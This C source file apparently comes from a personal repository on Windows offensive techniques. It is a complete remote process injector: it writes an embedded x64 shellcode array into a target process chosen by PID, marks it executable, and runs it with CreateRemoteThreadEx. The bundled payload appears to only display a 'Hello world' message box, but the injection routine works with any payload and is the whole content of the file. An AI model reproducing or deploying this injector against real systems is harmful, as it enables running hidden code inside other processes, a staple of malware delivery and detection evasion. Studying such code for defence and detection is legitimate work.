/**
 * Author : Yekuuun
 * Github : https://github.com/Yekuuun
 * 
 * Notes : Base payload injection using (common Win API functions)
 */

#include <stdio.h>
#include <windows.h>

//https://github.com/arsium/ShellCodeExec/blob/main/ShellCodeLoader.c
char shellcode_x64[] = "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
"\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
"\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
"\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
"\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
"\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
"\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
"\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
"\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
"\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
"\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
"\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
"\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
"\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
"\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
"\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
"\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
"\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
"\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
"\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
"\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
"\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
"\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
"\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
"\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
"\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
"\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
"\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
"\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";

/**
 * Base shellcode injection using base WinApi functions.
 * @param PBYTE ptr to payload.
 * @param SIZE_T size of payload.
 * @param PID PID of target process.
 * 
 * @return BOOL condition based on operation sucess.
 */
BOOL ShellcodeInject(IN PBYTE Payload, IN SIZE_T sPayloadSize, IN DWORD PID){
    BOOL   STATE           = TRUE;
    DWORD  OldProtect      = 0;
    DWORD  TID             = 0;
    HANDLE hProcess        = NULL;
    HANDLE hThread         = NULL;
    LPVOID Buffer          = NULL;

    //handle to process.
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
    if(hProcess == NULL){
        printf("[!] Unable to to get handle to process with PID : %i \n", PID);
        return FALSE;
    }

    //allocating memory.
    Buffer = VirtualAllocEx(hProcess, NULL, sPayloadSize, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if(Buffer == NULL){
        printf("[!] Unable to allocate memory \n");
        STATE = FALSE; goto _EndFunc;
    }

    if(!WriteProcessMemory(hProcess, Buffer, Payload, sPayloadSize, 0)){
        printf("[!] Unable to write memory \n");
        STATE = FALSE; goto _EndFunc;
    }

    if(!VirtualProtectEx(hProcess, Buffer, sPayloadSize, PAGE_EXECUTE_READ, &OldProtect)){
        printf("[!] Error calling VirtualProtectEx \n");
        STATE = FALSE; goto _EndFunc;
    }

    hThread = CreateRemoteThreadEx(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)Buffer, NULL, 0, 0, &TID);
    if(hThread == NULL){
        printf("[!] Error calling CreateRemoteThreadEx \n");
        STATE = FALSE; goto _EndFunc;
    }

    printf("[*] Successfully inject payload into process.\n");
    WaitForSingleObject(hThread, INFINITE);

//CLEANUP.
_EndFunc:
    if(hThread){
        CloseHandle(hThread);
    }

    if(hProcess){
        CloseHandle(hProcess);
    }

    if(Buffer){
        VirtualFree(Buffer, 0, MEM_RELEASE);
    }

    return STATE;
}

//test.
int main(int argc, char *argv[]){
    if(argc != 2){
        printf("[!] Program must received one argument : <PID> \n");
        return EXIT_FAILURE;
    }

    if(!ShellcodeInject(shellcode_x64, sizeof(shellcode_x64), atoi(argv[1]))){
        printf("[!] Shellcode injection failed.\n");
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}